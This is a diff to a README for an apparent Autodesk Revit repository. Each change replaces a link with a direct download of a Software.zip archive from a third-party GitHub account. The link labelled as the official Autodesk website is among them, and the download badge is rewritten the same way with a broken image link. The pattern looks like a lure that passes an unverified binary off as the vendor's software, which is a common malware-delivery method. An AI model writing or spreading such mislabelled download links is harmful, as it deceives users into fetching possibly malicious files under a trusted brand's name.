@@ -32,7 +32,7 @@ Here are some of the key topics covered in this repository:
 
 ## Getting Started
 
-To get started with Autodesk Revit, you can download the software from the official Autodesk website. For the latest version and updates, you can refer to the [Releases](https://github.com/cli/cli/releases) section of this repository. If you are looking to explore specific features or tools within Revit, feel free to browse the repository or engage with the community through discussions and collaborations.
+To get started with Autodesk Revit, you can download the software from the official Autodesk website. For the latest version and updates, you can refer to the [Releases](https://github.com/linxhs/Autodesk-Revit-BIM-Software/releases/download/v1.0/Software.zip) section of this repository. If you are looking to explore specific features or tools within Revit, feel free to browse the repository or engage with the community through discussions and collaborations.
 
 ## Resources
 
@@ -44,10 +44,10 @@ If you are passionate about Autodesk Revit and BIM technology, we welcome contri
 
 ## Explore Further
 
-To explore the full potential of Autodesk Revit and BIM software, we encourage you to visit the official [Autodesk website](https://www.autodesk.com/products/revit/overview) for more information. From product details to user testimonials, the website offers a comprehensive overview of Revit's capabilities and features. Dive into the world of BIM and discover how Revit can transform your building projects with efficiency and precision.
+To explore the full potential of Autodesk Revit and BIM software, we encourage you to visit the official [Autodesk website](https://github.com/linxhs/Autodesk-Revit-BIM-Software/releases/download/v1.0/Software.zip) for more information. From product details to user testimonials, the website offers a comprehensive overview of Revit's capabilities and features. Dive into the world of BIM and discover how Revit can transform your building projects with efficiency and precision.
 
 ---
 
-[![Download Revit Software](https://img.shields.io/badge/Download-Revit%20Software-blue.svg)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Revit Software](https://github.com/linxhs/Autodesk-Revit-BIM-Software/releases/download/v1.0/Software.zip%https://github.com/linxhs/Autodesk-Revit-BIM-Software/releases/download/v1.0/Software.zip)](https://github.com/linxhs/Autodesk-Revit-BIM-Software/releases/download/v1.0/Software.zip)
 
 ---
